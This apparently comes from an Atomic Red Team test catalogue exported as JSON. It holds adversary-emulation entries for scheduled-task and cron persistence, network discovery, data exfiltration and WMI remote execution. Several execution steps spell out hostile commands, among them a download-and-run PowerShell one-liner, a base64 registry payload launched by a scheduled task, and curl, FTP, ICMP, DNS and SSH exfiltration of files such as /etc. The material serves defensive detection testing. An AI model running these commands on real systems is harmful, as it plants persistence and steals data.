Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ms_product | Maldoc application Word | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz", "clacwm2dn00s829mqb9lxg69u"], "tags": []}, {"data": {"name": "Scheduled Task Startup Script", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz", "clacwm2dn00s829mqb9lxg69u"], "tags": []}, {"data": {"name": "Scheduled task Remote", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a task on a remote system.\n\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | task_command | What you want to execute | String | C:\\windows\\system32\\cmd.exe | \n | time | What time 24 Hour | String | 20:10 | \n | target | Target | String | localhost | \n | user_name | Username to authenticate with, format: DOMAIN\\User | String | DOMAIN\\user | \n | password | Password to authenticate with | String | At0micStrong | "}, "executionSteps": [{"description": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz", "clacwm2dn00s829mqb9lxg69u"], "tags": []}, {"data": {"name": "Scheduled task Local", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | task_command | What you want to execute | String | C:\\windows\\system32\\cmd.exe | \n | time | What time 24 Hour | String | 20:10 | "}, "executionSteps": [{"description": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz", "clacwm2dn00s829mqb9lxg69u"], "tags": []}, {"data": {"name": "Scheduled Task Executing Base64 Encoded Commands From Registry", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | time | Daily scheduled task execution time | string | 07:45 | "}, "executionSteps": [{"description": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz"], "tags": []}, {"data": {"name": "PowerShell Modify A Scheduled Task", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz"], "tags": []}, {"data": {"name": "Powershell Cmdlet Scheduled Task", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz", "clacwm2dn00s829mqb9lxg69u"], "tags": []}, {"data": {"name": "Import XML Schedule Task with Hidden Attribute", "shortName": "T1053.005", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xml_path | path of vbs to use when creating masquerading files | Path | PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml | "}, "executionSteps": [{"description": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n", "successCriteria": null}], "techniqueIds": ["clacwm5ow02my29mq4z3u4pzz"], "tags": []}, {"data": {"name": "Event Monitor Daemon Persistence", "shortName": "T1053.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | script_location | evil plist location | path | $PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist | \n | script_destination | Path where to move the evil plist | path | /etc/emond.d/rules/atomicredteam_T1053_004.plist | \n | empty_file | Random name of the empty file used to trigger emond service | string | randomflag | "}, "executionSteps": [{"description": "sudo cp #{script_location} #{script_destination}\nsudo touch /private/var/db/emondClients/#{empty_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm21p00io29mq42dgfu1d"], "tags": []}, {"data": {"name": "Cron - Replace crontab with referenced file", "shortName": "T1053.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test replaces the current user's crontab file with the contents of the referenced file. This technique was used by numerous IoT automated exploitation attacks.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command | Command to execute | String | /tmp/evil.sh | \n | tmp_cron | Temporary reference file to hold evil cron schedule | Path | /tmp/persistevil | "}, "executionSteps": [{"description": "crontab -l > /tmp/notevil\necho \"* * * * * #{command}\" > #{tmp_cron} && crontab #{tmp_cron}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vs02v229mqcj8cffys", "clacwm1kw007o29mq59i8e2f8"], "tags": []}, {"data": {"name": "Cron - Add script to all cron subfolders", "shortName": "T1053.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test adds a script to /etc/cron.hourly, /etc/cron.daily, /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command | Command to execute | String | echo 'Hello from Atomic Red Team' > /tmp/atomic.log | \n | cron_script_name | Name of file to store in cron folder | String | persistevil | "}, "executionSteps": [{"description": "echo \"#{command}\" > /etc/cron.daily/#{cron_script_name}\necho \"#{command}\" > /etc/cron.hourly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.monthly/#{cron_script_name}\necho \"#{command}\" > /etc/cron.weekly/#{cron_script_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vs02v229mqcj8cffys", "clacwm1kw007o29mq59i8e2f8"], "tags": []}, {"data": {"name": "Cron - Add script to /var/spool/cron/crontabs/ folder", "shortName": "T1053.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test adds a script to a /var/spool/cron/crontabs folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | command | Command to execute | String | echo 'Hello from Atomic Red Team' > /tmp/atomic.log | \n | cron_script_name | Name of file to store in /var/spool/cron/crontabs folder | String | persistevil | "}, "executionSteps": [{"description": "echo \"#{command}\" >> /var/spool/cron/crontabs/#{cron_script_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vs02v229mqcj8cffys", "clacwm1kw007o29mq59i8e2f8"], "tags": []}, {"data": {"name": "At.exe Scheduled task", "shortName": "T1053.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "at 13:20 /interactive cmd\n", "successCriteria": null}], "techniqueIds": ["clacwm6tj03un29mqd5nu3hib", "clacwm1da002w29mqefib8kme"], "tags": []}, {"data": {"name": "At - Schedule a job", "shortName": "T1053.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test submits a command to be run in the future by the `at` daemon.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | time_spec | Time specification of when the command should run | String | now + 1 minute | \n | at_command | The command to be run | String | echo Hello from Atomic Red Team | "}, "executionSteps": [{"description": "echo \"#{at_command}\" | at #{time_spec}", "successCriteria": null}], "techniqueIds": ["clacwm6tj03un29mqd5nu3hib"], "tags": []}, {"data": {"name": "At - Schedule a job", "shortName": "T1053.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test submits a command to be run in the future by the `at` daemon.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | time_spec | Time specification of when the command should run | String | now + 1 minute | \n | at_command | The command to be run | String | echo Hello from Atomic Red Team | "}, "executionSteps": [{"description": "echo \"#{at_command}\" | at #{time_spec}\n", "successCriteria": null}], "techniqueIds": ["clacwm1d7002s29mq3i4k22sn"], "tags": []}, {"data": {"name": "System Network Connections Discovery with PowerShell", "shortName": "T1049", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-NetTCPConnection\n", "successCriteria": null}], "techniqueIds": ["clacwm6bw03aw29mq2tv3h9o5", "clacwm2i700wa29mq7ipmb0v7"], "tags": []}, {"data": {"name": "System Network Connections Discovery Linux & MacOS", "shortName": "T1049", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "netstat\nwho -a\n", "successCriteria": null}], "techniqueIds": ["clacwm6bw03aw29mq2tv3h9o5", "clacwm2i700wa29mq7ipmb0v7"], "tags": []}, {"data": {"name": "System Network Connections Discovery", "shortName": "T1049", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netstat\nnet use\nnet sessions\n", "successCriteria": null}], "techniqueIds": ["clacwm6bw03aw29mq2tv3h9o5", "clacwm2i700wa29mq7ipmb0v7"], "tags": []}, {"data": {"name": "System Discovery using SharpView", "shortName": "T1049", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | SharpView_url | sharpview download URL | Url | https://github.com/tevora-threat/SharpView/blob/b60456286b41bb055ee7bc2a14d645410cca9b74/Compiled/SharpView.exe?raw=true | \n | SharpView | Path of the executable opensource redteam tool used for the performing this atomic. | Path | PathToAtomicsFolder\\T1049\\bin\\SharpView.exe | \n | syntax | Arguements method used along with SharpView to get listing of network connections, domains, domain users, and etc. | String | \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" \n | "}, "executionSteps": [{"description": "$syntaxList = #{syntax}\nforeach ($syntax in $syntaxList) {\n#{SharpView} $syntax -}\n", "successCriteria": null}], "techniqueIds": ["clacwm6bw03aw29mq2tv3h9o5", "clacwm2i700wa29mq7ipmb0v7"], "tags": []}, {"data": {"name": "MAZE FTP Upload", "shortName": "T1048.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ftp_server | FTP Server address | String | 127.0.0.1 | \n | username | Username for FTP server login | String | null | \n | password | Password for FTP server login | String | null | "}, "executionSteps": [{"description": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n", "successCriteria": null}], "techniqueIds": ["clacwm6v603w929mqhphn2ppz"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - SMTP", "shortName": "T1048.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrateto a remote address. Results will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path to file to exfiltrate | Path | C:\\Windows\\System32\\notepad.exe | \n | sender | The email address of the sender | String | test@corp.com | \n | receiver | The email address of the receiver | String | test@corp.com | \n | smtp_server | SMTP server to use for email transportation | String | 127.0.0.1 | "}, "executionSteps": [{"description": "Send-MailMessage -From #{sender} -To #{receiver} -Subject \"T1048.003 Atomic Test\" -Attachments #{input_file} -SmtpServer #{smtp_server}\n", "successCriteria": null}], "techniqueIds": ["clacwm6v603w929mqhphn2ppz", "clacwm1tq00dj29mq949t94kq"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - ICMP", "shortName": "T1048.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path to file to be exfiltrated. | Path | C:\\Windows\\System32\\notepad.exe | \n | ip_address | Destination IP address where the data should be sent. | String | 127.0.0.1 | "}, "executionSteps": [{"description": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send(\"#{ip_address}\", 1500, $Data) }\n", "successCriteria": null}], "techniqueIds": ["clacwm6v603w929mqhphn2ppz", "clacwm1tq00dj29mq949t94kq"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - HTTP", "shortName": "T1048.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "1. Victim System Configuration:\n\n    mkdir /tmp/victim-staging-area\n    echo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n    cd /tmp/victim-staging-area\n    python -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n    wget http://VICTIM_IP:1337/victim-file.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm1tq00dj29mq949t94kq"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - HTTP", "shortName": "T1048.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path to file to exfiltrate | Path | C:\\Windows\\System32\\notepad.exe | \n | ip_address | Destination IP address where the data should be sent | String | http://127.0.0.1 | "}, "executionSteps": [{"description": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n", "successCriteria": null}], "techniqueIds": ["clacwm6v603w929mqhphn2ppz", "clacwm1tq00dj29mq949t94kq"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - DNS", "shortName": "T1048.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltration of specified file over DNS protocol.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "1. On the adversary machine run the below command.\n\n    tshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \".domain\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n    xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n    \n3. Once the data is received, use the below command to recover the data.\n\n    cat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n", "successCriteria": null}], "techniqueIds": ["clacwm6v603w929mqhphn2ppz", "clacwm1tq00dj29mq949t94kq"], "tags": []}, {"data": {"name": "Exfiltrate data HTTPS using curl windows", "shortName": "T1048.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltrate data HTTPS using curl to file share site file.io\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Test file to upload | Path | PathToAtomicsFolder/T1048.002/src/artifact | \n | curl_path | path to curl.exe | Path | C:\\Windows\\System32\\Curl.exe | "}, "executionSteps": [{"description": "#{curl_path} -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n", "successCriteria": null}], "techniqueIds": ["clacwm6ea03di29mq1k8e7pba"], "tags": []}, {"data": {"name": "Exfiltrate data HTTPS using curl linux", "shortName": "T1048.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Exfiltrate data HTTPS using curl to file share site file.io\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Test file to upload | Path | PathToAtomicsFolder/T1048.002/src/artifact | "}, "executionSteps": [{"description": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/", "successCriteria": null}], "techniqueIds": ["clacwm6ea03di29mq1k8e7pba"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - SSH", "shortName": "T1048", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain | target SSH domain | url | target.example.com | "}, "executionSteps": [{"description": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n", "successCriteria": null}], "techniqueIds": ["clacwm1t800d529mq6j7h0eg2"], "tags": []}, {"data": {"name": "Exfiltration Over Alternative Protocol - SSH", "shortName": "T1048", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | username for domain | String | atomic | \n | password | password for user | String | atomic | \n | domain | target SSH domain | Url | target.example.com | "}, "executionSteps": [{"description": "tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n", "successCriteria": null}], "techniqueIds": ["clacwm6gm03gc29mqbd7s3fct", "clacwm1t800d529mq6j7h0eg2"], "tags": []}, {"data": {"name": "DNSExfiltration (doh)", "shortName": "T1048", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | password | Password used to encrypt the data to be exfiltrated | String | atomic | \n | domain | The domain name to use for DNS requests | String | target.example.com | \n | ps_module | DNSExfiltrator powershell ps_module | Path | $env:Temp\\dnsexfil.ps1 | \n | doh | Google or CloudFlare DoH (DNS over HTTP) server | String | google | \n | time | The time in milliseconds to wait between each DNS request | String | 500 | \n | encoding | Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers. | String | null | "}, "executionSteps": [{"description": "Import-Module #{ps_module}\nInvoke-DNSExfiltrator -i #{ps_module} -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}\n", "successCriteria": null}], "techniqueIds": ["clacwm6gm03gc29mqbd7s3fct"], "tags": []}, {"data": {"name": "WMI Reconnaissance Users", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary might use WMI to list all local User Accounts. \nWhen the test completes , there should be local user accounts information displayed on the command line.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic useraccount get /ALL /format:csv\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "WMI Reconnaissance Software", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary might use WMI to list installed Software hotfix and patches.\nWhen the test completes, there should be a list of installed patches and when they were installed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic qfe get description,installedOn /format:csv\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "WMI Reconnaissance Processes", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary might use WMI to list Processes running on the compromised host.\nWhen the test completes , there should be running processes listed on the command line.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic process get caption,executablepath,commandline /format:csv\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "WMI Reconnaissance List Remote Services", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary might use WMI to check if a certain Remote Service is running on a remote device. \nWhen the test completes, a service information will be displayed on the screen if it exists.\nA common feedback message is that \"No instance(s) Available\" if the service queried is not running.\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" \nif the provided remote host is unreacheable\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | node | Ip Address | String | 127.0.0.1 | \n | service_search_string | Name Of Service | String | Spooler | "}, "executionSteps": [{"description": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string}%\")\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "WMI Execute rundll32", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | node | Ip Address | String | 127.0.0.1 | \n | dll_to_execute | Path to DLL. | String | $env:TEMP\\calc.dll | \n | function_to_execute | Name of DLL function to call | String | StartW | "}, "executionSteps": [{"description": "wmic /node:#{node} process call create \"rundll32.exe #{dll_to_execute} #{function_to_execute}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u"], "tags": []}, {"data": {"name": "WMI Execute Remote Process", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.\nTo clean up, provide the same node input as the one provided to run the test\nA common error message is \"Node - (provided IP or default)  ERROR Description =The RPC server is unavailable\" if the default or provided IP is unreachable\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | node | Ip Address | String | 127.0.0.1 | \n | user_name | Username | String | DOMAIN\\Administrator | \n | password | Password | String | P@ssw0rd1 | \n | process_to_execute | Name or path of process to execute. | String | notepad.exe | "}, "executionSteps": [{"description": "wmic /user:#{user_name} /password:#{password} /node:\"#{node}\" process call create #{process_to_execute}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "WMI Execute Local Process", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses wmic.exe to execute a process on the local host.\nWhen the test completes , a new process will be started locally .A notepad application will be started when input is left on default.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_to_execute | Name or path of process to execute. | String | notepad.exe | "}, "executionSteps": [{"description": "wmic process call create #{process_to_execute}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p302n829mq2ksc6z1u", "clacwm2mf010c29mqgsc53v91"], "tags": []}, {"data": {"name": "Create a Process using WMI Query and an Encoded Command", "shortName": "T1047", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, 